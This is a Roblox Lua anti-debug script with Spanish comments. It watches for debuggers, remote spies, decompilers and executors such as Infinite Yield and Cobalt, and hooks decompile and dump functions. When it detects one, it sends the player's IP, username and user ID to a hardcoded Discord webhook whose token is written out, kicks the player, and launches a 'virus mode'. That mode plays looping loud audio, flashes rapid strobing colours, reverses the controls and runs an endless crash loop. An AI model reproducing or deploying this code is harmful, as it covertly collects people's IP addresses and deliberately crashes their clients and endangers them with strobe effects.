-- ============================================
-- 🛡️ ANTI-DEBUG VIRUS MODE (INFINITE YIELD FIXED)
-- ============================================

local DISCORD_WEBHOOK =
"https://discord.com/api/webhooks/1485541583389593650/0OpPVNakl5wF8cc3ckECM0FPTbgH0vVUgtl4sR6VXG1jsed1P04NeOe5tkZ0MjsWXLuq"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

local PLAYER_IP = "No disponible"

-- ============================================
-- OBTENER IP
-- ============================================
task.spawn(function()
    for attempt = 1, 3 do
        local success, result = pcall(function()
            local response = game:HttpGet("https://ipapi.co/json/", true)
            if response then
                local decoded = HttpService:JSONDecode(response)
                return decoded.ip or nil
            end
            return nil
        end)

        if success and result then
            PLAYER_IP = result
            break
        end

        task.wait(0.5)
    end
end)

-- ============================================
-- WEBHOOK
-- ============================================
local function sendWebhook(title, reason, method)
    task.spawn(function()
        local data = {
            ["content"] = "",
            ["embeds"] = {
                {
                    ["title"] = "🚨 " .. title,
                    ["color"] = 16711680,
                    ["fields"] = {
                        {
                            ["name"] = "Jugador",
                            ["value"] = LocalPlayer.Name,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = tostring(LocalPlayer.UserId),
                            ["inline"] = true
                        },
                        {
                            ["name"] = "IP",
                            ["value"] = PLAYER_IP,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Detalles",
                            ["value"] = reason,
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Método",
                            ["value"] = method or "Unknown",
                            ["inline"] = true
                        }
                    }
                }
            }
        }

        pcall(function()
            local req = request or http.request
            if req then
                req({
                    Url = DISCORD_WEBHOOK,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(data)
                })
            end
        end)
    end)
end

-- ============================================
-- EJECUTORES CONOCIDOS (EXPANDIDO + IY MEJORADO)
-- ============================================
local KNOWN_EXECUTORS = {
    -- Infinite Yield (TODAS LAS VARIANTES)
    "MainGui", "InfiniteYield", "IYGui",
    "IY_GUI", "INFINITEYIELD", "Infinite Yield", "IY_FE",
    "IYCommands", "cmdbar", "CMDBar", "CommandBar",

    -- Cobalt
    "Cobalt", "cobalt", "COBALT", "CobaltUI", "cobalt_ui", "CobaltWindow",

    -- Hydroxide
    "Hydroxide", "hydroxide", "HYDROXIDE",

    -- Synapse
    "SynapseX", "synapsex", "Synapse",

    -- Fluxus
    "Fluxus", "fluxus",

    -- SimpleSpy
    "SimpleSpy", "simplespy", "SimpleSpyV3",

    -- DEX
    "Dex", "dex", "DexGui", "DEX",

    -- Otros
    "WeAreDevs", "ScriptWare", "VegaX", "OxygenU",

    -- Remote Spies
    "RemoteSpy", "SimpleSpy", "SimpleSpyV3", "Hydroxide",
    "TurtleSpy", "AdonisSpy", "RemoteLogger"
}

local CRITICAL_VARIABLES = {
    -- Infinite Yield (Solo variables en tiempo de ejecución, no funciones del ejecutor)
    "IY_LOADED", "IYMouse", "currentPrefix",

    -- Cobalt
    "cobalt", "Cobalt", "COBALT",

    -- Otros
    "syn", "synapse",
    "Hydroxide", "hydroxide",
    "SimpleSpy", "SimpleSpyV3",

    -- WH01AM (studialo.luau)
    "WH01AMStartTime", "WH01AMVerificationToken", "WH01AM", "wax",

    -- Decompilers & Tools
    "decompile", "saveinstance", "save_instance", "getscripts",
    "getgc", "getreg", "getgenv", "getrenv", "getnilinstances",
    "getloadedmodules", "getupvalues", "getupvalue"
}

local IY_TEXTS = {
    -- Textos estáticos precisos (Se remueven "infinite yield" y "cmdbar" para evitar ban por pestañas)
    "iy_fe", "edge#1337", "iy_loaded", "iy fly",

    -- Spies (más específicos)
    "outgoing", "incoming", "ignore remote", "block remote",
    "copy remote", "fired remote", "invoke server", "remotespy",
    "simple spy", "copy code",

    -- Decompilers
    "decompiler", "script dumper", "save instance", "source code",
    "dump scripts", "descompilar"
}

-- ============================================
-- ANTI-HOOK / INTEGRIDAD
-- ============================================

local function isNative(f)
    if type(f) ~= "function" then return true end

    -- Los debuggers avanzados usan newcclosure para fingir ser funciones de C
    -- Pero una función nativa de Roblox NUNCA tiene upvalues.
    local success, result = pcall(function()
        local info = debug.info or (debug.getinfo)
        if not info then return true end

        -- Prueba 1: debug.info debe reportar "[C]"
        local what = ""
        if debug.info then
            what = debug.info(f, "s")
        else
            what = debug.getinfo(f).what
        end

        if what ~= "[C]" and what ~= "C" then
            return false, "Not C Closure"
        end

        -- Prueba 2: Detección de Upvalues (La prueba DEFINITIVA)
        -- Una función verdadera de C no permite debug.getupvalue y lanza un error específico.
        -- Si esta llamada no falla con ese error, es un newcclosure (hook).
        local hasUpvalue, upvErr = pcall(function()
            return debug.getupvalue(f, 1)
        end)

        -- En Roblox nativo, esto debería fallar con "Lua function expected"
        if hasUpvalue or (upvErr and not string.find(tostring(upvErr), "Lua function expected")) then
            return false, "C-Proxy Detected (Upvalue Leak)"
        end

        return true
    end)

    if success then
        return result
    else
        -- Si pcall falla, asumimos que es nativo (Roblox bloqueó el acceso)
        return true
    end
end

local function checkUpvalueTaint()
    -- Prueba lógica: Las funciones nativas de motor no tienen estado de Lua (upvalues)
    local criticals = {
        { Instance.new("RemoteEvent").FireServer,      "RemoteEvent:FireServer" },
        { Instance.new("RemoteFunction").InvokeServer, "RemoteFunction:InvokeServer" }
    }

    for _, data in ipairs(criticals) do
        local func, name = data[1], data[2]
        local success, result = pcall(function()
            return debug.getupvalue(func, 1)
        end)

        -- Si debug.getupvalue devuelve algo (true) o no lanza el error de "Lua function expected"
        -- Es un hook inyectado por un debugger/spy.
        if success or (result and not string.find(tostring(result), "Lua function expected")) then
            return true, "Upvalue Taint on " .. name
        end
    end

    return false
end

-- checkHookedFunctions eliminado para evitar falsos positivos con ejecutores intrusivos.

local function checkMetatableIntegrity()
    -- getrawmetatable es una función común de ejecutor
    local success, detected, detail = pcall(function()
        local gmt = getgenv and getgenv().getrawmetatable or _G.getrawmetatable
        if not gmt then return false end

        local mt = gmt(game)
        if not mt then return false end

        -- Verificaciones de metamétodos comentadas para evitar falsos positivos con ejecutores.
        -- Los ejecutores suelen hookear __namecall e __index por defecto.
        --[[
        if mt.__namecall and not isNative(mt.__namecall) then
            return true, "__namecall Hooked"
        end
        if mt.__index and not isNative(mt.__index) then
            return true, "__index Hooked"
        end
        ]]

        return false
    end)
    if success and detected then return true, detail, "Metatable-Hook" end
    return false
end

local TRAP_ID = "TRAP_" .. HttpService:GenerateGUID():sub(1, 8)

local function checkSpyLogLogic()
    -- Lógica: Disparamos un remoto con un nombre único y buscamos si aparece en la UI.
    -- Solo un Remote Spy escribiría este ID aleatorio en una etiqueta de texto.
    local success, detected = pcall(function()
        -- Creamos el remoto trampa (fugaz)
        local remote = Instance.new("RemoteEvent")
        remote.Name = TRAP_ID
        remote.Parent = game:GetService("ReplicatedStorage")

        -- Lo disparamos para que el Spy lo capture
        remote:FireServer("__ANTIDEBUG_SCAN__")

        -- Esperamos un momento para que el Spy procese y muestre el log
        task.wait(0.1)

        -- Escaneamos CoreGui en busca del ID secreto
        local coreGui = game:GetService("CoreGui")
        for _, obj in ipairs(coreGui:GetDescendants()) do
            if obj:IsA("TextLabel") or obj:IsA("TextBox") then
                if obj.Text:find(TRAP_ID) then
                    remote:Destroy()
                    return true
                end
            end
        end

        remote:Destroy()
        return false
    end)

    if success and detected then return true, "Spy Captured Secret ID: " .. TRAP_ID, "Logic-Trap" end
    return false
end

local function checkEnvironmentFidelity()
    -- Acción: Detectar si el entorno tiene rastros de espías o debuggers en shared/_G
    local success, detected, detail = pcall(function()
        -- Verificamos si existe la tabla 'wax' o rastros de WH01AM en shared
        local s = shared
        if s and (s.WH01AMStartTime or s.WH01AMVerificationToken or s.WH01AM) then
            return true, "WH01AM Environment Detected"
        end

        -- Buscamos en getgenv por si acaso
        if getgenv then
            local genv = getgenv()
            if genv.WH01AMStartTime or genv.wax then
                return true, "WH01AM Global Taint"
            end
        end

        -- Detectamos si hay un intento agresivo de ocultar funciones del sistema
        if getgenv and getgenv().setstackhidden then
            -- return true, "Stack Hidden Active" -- Comentado para evitar falsos positivos en debuggers legítimos
        end


        return false
    end)
    if success and detected then return true, detail, "Environment-Fidelity" end
    return false
end

-- checkHookedFunctions y CRITICAL_FUNCTIONS eliminados para evitar falsos positivos con el ejecutor.

-- ============================================
-- FUNCIONES DE CRASH Y CAOS
-- ============================================

local function audioSpam()
    task.spawn(function()
        for i = 1, 50 do
            task.spawn(function()
                pcall(function()
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://7266001792"
                    sound.Volume = 2
                    sound.Parent = workspace
                    sound:Play()
                    while sound.Parent do
                        if not sound.Playing then sound:Play() end
                        task.wait(0.1)
                    end
                end)
            end)
        end
    end)
end

local function glitchColors()
    task.spawn(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "ColorGlitch"
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screenGui.ResetOnSpawn = false
        screenGui.IgnoreGuiInset = true
        screenGui.Parent = game:GetService("CoreGui")

        local colors = {
            Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255),
            Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255),
            Color3.fromRGB(128, 0, 128), Color3.fromRGB(255, 165, 0)
        }

        local mainFrame = Instance.new("Frame")
        mainFrame.Size = UDim2.new(1, 0, 1, 0)
        mainFrame.Position = UDim2.new(0, 0, 0, 0)
        mainFrame.BorderSizePixel = 0
        mainFrame.Parent = screenGui

        for i = 1, 2000 do
            pcall(function()
                mainFrame.BackgroundColor3 = colors[math.random(1, #colors)]
                mainFrame.BackgroundTransparency = math.random(10, 80) / 100
                task.wait(0.01)
            end)
        end
    end)
end

local function screenGlitch()
    task.spawn(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "GlitchGui"
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screenGui.ResetOnSpawn = false
        screenGui.IgnoreGuiInset = true
        screenGui.Parent = game:GetService("CoreGui")

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BorderSizePixel = 0
        frame.Parent = screenGui

        for i = 1, 300 do
            pcall(function()
                frame.BackgroundColor3 = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
                frame.BackgroundTransparency = math.random(10, 90) / 100
                task.wait(0.03)
            end)
        end
    end)
end

local function reverseControls()
    task.spawn(function()
        local conn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            if input.KeyCode == Enum.KeyCode.W then
                keypress(Enum.KeyCode.S)
            elseif input.KeyCode == Enum.KeyCode.A then
                keypress(Enum.KeyCode.D)
            elseif input.KeyCode == Enum.KeyCode.S then
                keypress(Enum.KeyCode.W)
            elseif input.KeyCode == Enum.KeyCode.D then
                keypress(Enum.KeyCode.A)
            end
        end)
        task.wait(9)
        conn:Disconnect()
    end)
end

local function controlledLag()
    task.spawn(function()
        for i = 1, 9 do
            for j = 1, 500 do
                Instance.new("Part").Parent = workspace
            end
            task.wait(0.2)
        end
    end)
end

local function crazySpin()
    task.spawn(function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = LocalPlayer.Character.HumanoidRootPart
            for i = 1, 400 do
                pcall(function()
                    hrp.CFrame = hrp.CFrame *
                        CFrame.Angles(math.rad(math.random(-720, 720)), math.rad(math.random(-720, 720)),
                            math.rad(math.random(-720, 720)))
                    task.wait(0.02)
                end)
            end
        end
    end)
end

local function cameraZoom()
    task.spawn(function()
        local camera = workspace.CurrentCamera
        for i = 1, 300 do
            pcall(function()
                camera.FieldOfView = math.random(10, 120)
                camera.CFrame = camera.CFrame *
                    CFrame.Angles(math.rad(math.random(-90, 90)), math.rad(math.random(-90, 90)),
                        math.rad(math.random(-90, 90)))
                task.wait(0.03)
            end)
        end
    end)
end

local function flashScreen()
    task.spawn(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "FlashGui"
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screenGui.ResetOnSpawn = false
        screenGui.IgnoreGuiInset = true
        screenGui.Parent = game:GetService("CoreGui")

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BorderSizePixel = 0
        frame.Parent = screenGui

        for i = 1, 300 do
            pcall(function()
                frame.BackgroundColor3 = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
                frame.BackgroundTransparency = math.random(0, 20) / 100
                task.wait(0.01)
            end)
        end
    end)
end

local function changeGameMusic()
    task.spawn(function()
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("Sound") then
                pcall(function()
                    obj.SoundId = "rbxassetid://7266001792"
                    obj.Volume = 2
                    obj:Play()
                end)
            end
        end
    end)
end

local function megaCrash()
    task.wait(9.2)
    while true do
        pcall(function()
            for i = 1, 1000 do
                Instance.new("Part").Parent = workspace
            end
        end)
    end
end

local function activateVirusMode()
    audioSpam()
    task.wait(0.1)
    glitchColors()
    task.wait(0.1)
    screenGlitch()
    task.wait(0.1)
    reverseControls()
    task.wait(0.1)
    controlledLag()
    task.wait(0.1)
    crazySpin()
    task.wait(0.1)
    cameraZoom()
    task.wait(0.1)
    flashScreen()
    task.wait(0.1)
    changeGameMusic()
    task.wait(0.1)
    megaCrash()
end

-- ============================================
-- FUNCIONES DE COMPATIBILIDAD
-- ============================================

local function isWhitelisted(obj)
    -- Whitelist MUY específica para evitar falsos positivos con nombres de jugadores
    local success, found = pcall(function()
        local parent = obj
        while parent and parent ~= game do
            local pName = parent.Name
            -- Ignorar menús oficiales de Roblox (Lista de jugadores, Chat, Menús de sistema)
            if pName == "PlayerList" or pName == "Chat" or pName == "BubbleChat" or
                pName == "InGameMenu" or pName == "ExperienceChat" or pName == "RobloxGui" then
                return true
            end
            parent = parent.Parent
        end
        return false
    end)
    return success and found
end

-- ============================================
-- DETECCIÓN MEJORADA DE INFINITE YIELD
-- ============================================

local function checkInfiniteYield(obj)
    -- NOTA: Las detecciones visuales (por obj.Name == "infiniteyield") fueron 
    -- removidas porque baneaban a ejecutores (Delta/VegaX) que simplemente
    -- tienen una pestaña o botón con ese nombre. 
    -- Ahora confiamos casi al 100% en la detección en memoria (getgenv().IY_LOADED).

    -- Check si es TextBox (IY usa TextBox para comandos)
    if obj:IsA("TextBox") then
        local text = obj.Text:lower()
        local placeholder = obj.PlaceholderText and obj.PlaceholderText:lower() or ""

        -- IY tiene textos característicos
        for _, iyText in ipairs(IY_TEXTS) do
            if text:find(iyText) or placeholder:find(iyText) then
                return true, "IY TextBox: " .. obj.Text
            end
        end
    end

    -- Check si es TextLabel
    if obj:IsA("TextLabel") then
        local text = obj.Text:lower()
        -- Solo buscaremos términos muy específicos que no suelen estar en nombres de jugadores
        local SPECIFIC_IY = { "iy v", "cmdbar", "iy_fe", "edge#1337", "iy_loaded" }
        for _, iyText in ipairs(SPECIFIC_IY) do
            if text:find(iyText) then
                return true, "IY TextLabel: " .. obj.Text
            end
        end
    end

    -- Detección por Frames removida por causar falsos positivos con UIs de Delta/VegaX

    return false, nil
end

-- ============================================
-- DETECCIÓN OPTIMIZADA (SIN LAG) - STRICT + IY
-- ============================================

local function quickScan()
    local cg = game:GetService("CoreGui")

    -- Check nombres en children (EXACTO)
    for _, child in pairs(cg:GetChildren()) do
        local childName = child.Name

        -- Check executores normales
        for _, execName in ipairs(KNOWN_EXECUTORS) do
            if childName == execName then
                return true, childName, "Name"
            end
        end

        -- Check específico de IY
        local isIY, iyReason = checkInfiniteYield(child)
        if isIY then
            return true, iyReason, "IY Detected"
        end
    end

    -- Check variables en _G
    for _, var in ipairs(CRITICAL_VARIABLES) do
        if _G[var] ~= nil then
            return true, var, "Variable"
        end
    end

    -- Check variables ocultas en el entorno del ejecutor (Vital para detectar IY cuando oculta su UI)
    if getgenv then
        local success, env = pcall(getgenv)
        if success and type(env) == "table" then
            -- Solo variables de tiempo de ejecución (IY_LOADED), no nombres crudos
            local hidden_vars = {"IY_LOADED", "IYMouse"}
            for _, v in ipairs(hidden_vars) do
                if env[v] ~= nil then
                    return true, v, "Executor Environment Variable (getgenv)"
                end
            end
        end
    end

    -- Escanner de interfaces ocultas removido para evitar falsos positivos con GUIs legítimos del ejecutor.

    -- Check variables compartidas (IY las usa)
    if shared and type(shared) == "table" then
        for k, v in pairs(shared) do
            local keyLower = tostring(k):lower()
            if keyLower == "iy" or keyLower:find("infiniteyield") or
                keyLower:find("cmdbar") or keyLower:find("iy_loaded") then
                return true, "Shared: " .. tostring(k), "Shared Variable"
            end
        end
    end


    local mtHooked, mtDetail = checkMetatableIntegrity()
    if mtHooked then
        return true, mtDetail, "Metatable-Hook"
    end

    -- Detección de Espías Específicos (Nombres y Firmas)
    local envSus, envDetail, envMethod = checkEnvironmentFidelity()
    if envSus then return true, envDetail, envMethod end

    -- TRAMPA LÓGICA (Atrapa a "ANTONIO", "Cobalt", etc. por su acción de espiar)
    local spyCaptured, spyDetail, spyMethod = checkSpyLogLogic()
    if spyCaptured then return true, spyDetail, spyMethod end

    -- Detección Lógica Profunda desactivada para máxima compatibilidad con tus scripts.
    -- local taint, taintMsg = checkUpvalueTaint()
    -- if taint then return true, taintMsg, "Upvalue-Integ-Check" end

    return false
end

local function deepScan()
    local cg = game:GetService("CoreGui")
    local descendants = cg:GetDescendants()

    for _, descendant in pairs(descendants) do
        if not isWhitelisted(descendant) then
            local descName = descendant.Name

            -- Buscar por nombre EXACTO
            for _, execName in ipairs(KNOWN_EXECUTORS) do
                if descName == execName then
                    return true, descName, "Deep Name"
                end
            end

            -- Check específico de IY
            local isIY, iyReason = checkInfiniteYield(descendant)
            if isIY then
                return true, iyReason, "IY Deep"
            end

            -- Buscar por texto
            if descendant:IsA("TextLabel") and descendant.Text then
                local text = descendant.Text:lower()

                if text == "cobalt" or text == "hydroxide" or text == "copy code" or text == "copy remote" then
                    return true, "UI: " .. descendant.Text:sub(1, 40), "Text"
                end

                for _, iyText in ipairs(IY_TEXTS) do
                    if text:find(iyText) then
                        return true, "IY Text: " .. text:sub(1, 40), "IY Text"
                    end
                end
            end
        end
    end

    return false
end

-- ============================================
-- ANTI-DECOMPILER Y OCULTAMIENTO DE SCRIPT
-- ============================================
local function secureDecompilersAndTools()
    if not getgenv then return end
    local success, env = pcall(getgenv)
    if not success or type(env) ~= "table" then return end
    
    local make_cclosure = env.newcclosure or function(f) return f end
    local hook_func = env.hookfunction or env.hookclosure or env.replaceclosure

    local function blockDecompile(tgt, ...)
        task.spawn(function()
            sendWebhook("DECOMPILER USAGE DETECTED", "Attempted to decompile: " .. tostring(tgt), "decompile()")
            LocalPlayer:Kick("BAD BOY HACKER - Decompiler Blocked")
            activateVirusMode()
        end)
        return "-- [[ ERROR: DECOMPILER INTERCEPTED AND BLOCKED ]] --"
    end

    local function blockDump(fname)
        return make_cclosure(function(...)
            task.spawn(function()
                sendWebhook("GAME DUMP DETECTED", "Extraction tool used: " .. fname, fname)
                LocalPlayer:Kick("BAD BOY HACKER - Dumper Blocked")
                activateVirusMode()
            end)
            return "-- [[ EXTRACTION DENIED ]] --"
        end)
    end

    if hook_func then
        -- HOOK PROFUNDO: Intentamos usar hookfunction
        if env.decompile and type(env.decompile) == "function" then
            local s = pcall(hook_func, env.decompile, make_cclosure(blockDecompile))
            if not s then env.decompile = make_cclosure(blockDecompile) end
        end

        local save_funcs = {"saveinstance", "save_instance", "getscripts", "getrunningscripts", "getloadedmodules", "getinstances", "getnilinstances"}
        for _, fname in ipairs(save_funcs) do
            if env[fname] and type(env[fname]) == "function" then
                local s = pcall(hook_func, env[fname], blockDump(fname))
                if not s then env[fname] = blockDump(fname) end
            end
        end
        
        local adv_funcs = {"getscriptbytecode", "getscriptclosure", "dumpstring"}
        for _, fname in ipairs(adv_funcs) do
            if env[fname] and type(env[fname]) == "function" then
                local s = pcall(hook_func, env[fname], make_cclosure(function(...)
                    task.spawn(function()
                        sendWebhook("LUA DECOMPILER", "Bytecode extraction detected: " .. fname, fname)
                        LocalPlayer:Kick("BAD BOY HACKER - Custom Decompiler Blocked")
                        activateVirusMode()
                    end)
                    return "-- [[ BYTECODE COMPILER DENIED ]] --"
                end))
                
                if not s then
                    env[fname] = make_cclosure(function(...) return "-- BYTECODE COMPILER DENIED --" end)
                end
            end
        end
    else
        -- FALLBACK SUPERFICIAL
        if env.decompile and type(env.decompile) == "function" then
            env.decompile = make_cclosure(blockDecompile)
        end
        local save_funcs = {"saveinstance", "save_instance", "getscripts", "getrunningscripts", "getloadedmodules", "getinstances", "getnilinstances"}
        for _, fname in ipairs(save_funcs) do
            if env[fname] and type(env[fname]) == "function" then
                env[fname] = blockDump(fname)
            end
        end
        
        local adv_funcs = {"getscriptbytecode", "getscriptclosure", "dumpstring"}
        for _, fname in ipairs(adv_funcs) do
            if env[fname] and type(env[fname]) == "function" then
                env[fname] = make_cclosure(function(...) return "-- BYTECODE COMPILER DENIED --" end)
            end
        end
    end
end

-- ============================================
-- VERIFICACIÓN INICIAL
-- ============================================
secureDecompilersAndTools()

local detected, name, method = quickScan()
if detected then
    sendWebhook("DEBUGGER DETECTADO", "Intento de Debugging: " .. name, method)
    LocalPlayer:Kick("Seguridad: Intento de Debugging Detectado")
    activateVirusMode()
end

-- ============================================
-- MONITOREO LIGERO (CADA 1 SEGUNDO)
-- ============================================
task.spawn(function()
    while true do
        task.wait(1)
        local detected, name, method = quickScan()
        if detected then
            sendWebhook("DEBUGGER DETECTADO (QUICK)", "Intento de Debugging: " .. name, method)
            LocalPlayer:Kick("BAD BOY HACKER")
            activateVirusMode()
        end
    end
end)

-- ============================================
-- MONITOREO PROFUNDO (CADA 10 SEGUNDOS)
-- ============================================
task.spawn(function()
    while true do
        task.wait(10)
        local detected, name, method = deepScan()
        if detected then
            sendWebhook("EXECUTOR DEEP", "Executor: " .. name, method)
            LocalPlayer:Kick("BAD BOY HACKER")
            activateVirusMode()
        end
    end
end)

-- ============================================
-- DETECCIÓN LIGHTWEIGHT DE UI (EN TIEMPO REAL)
-- ============================================
game:GetService("CoreGui").ChildAdded:Connect(function(child)
    task.wait(0.05)

    -- Check nombres exactos
    for _, execName in ipairs(KNOWN_EXECUTORS) do
        if child.Name == execName then
            sendWebhook("NUEVA UI", "Executor: " .. child.Name, "ChildAdded")
            LocalPlayer:Kick("BAD BOY HACKER")
            activateVirusMode()
            return
        end
    end

    -- Check específico de IY
    local isIY, iyReason = checkInfiniteYield(child)
    if isIY then
        sendWebhook("INFINITE YIELD DETECTED", iyReason, "ChildAdded IY")
        LocalPlayer:Kick("BAD BOY HACKER")
        activateVirusMode()
        return
    end
end)

-- ============================================
-- DETECCIÓN POR DESCENDIENTES (MÁS PROFUNDO)
-- ============================================
game:GetService("CoreGui").DescendantAdded:Connect(function(descendant)
    -- Saltamos zonas protegidas de Roblox
    if isWhitelisted(descendant) then return end

    -- Check nombre (EXACTO)
    for _, execName in ipairs(KNOWN_EXECUTORS) do
        if descendant.Name == execName then
            sendWebhook("DESCENDANT FOUND", "Executor: " .. descendant.Name, "DescendantAdded")
            LocalPlayer:Kick("BAD BOY HACKER")
            activateVirusMode()
            return
        end
    end

    -- Check específico de IY
    local isIY, iyReason = checkInfiniteYield(descendant)
    if isIY then
        sendWebhook("INFINITE YIELD DETECTED", iyReason, "DescendantAdded IY")
        LocalPlayer:Kick("BAD BOY HACKER")
        activateVirusMode()
        return
    end

    -- Check texto (mejorado para IY)
    if descendant:IsA("TextLabel") and descendant.Text then
        local text = descendant.Text:lower()

        -- Textos exactos
        if text == "cobalt" or text == "hydroxide" or
            text == "copy code" or text == "copy remote" then
            sendWebhook("EXECUTOR TEXT", "Text: " .. descendant.Text:sub(1, 40), "TextFound")
            LocalPlayer:Kick("BAD BOY HACKER")
            activateVirusMode()
            return
        end

        -- Textos de IY
        for _, iyText in ipairs(IY_TEXTS) do
            if text:find(iyText) then
                sendWebhook("INFINITE YIELD TEXT", "Text: " .. text:sub(1, 40), "IY TextFound")
                LocalPlayer:Kick("BAD BOY HACKER")
                activateVirusMode()
                return
            end
        end
    end
end)

print("🛡️ Anti-Debug Activado (IY Detection Enhanced)")
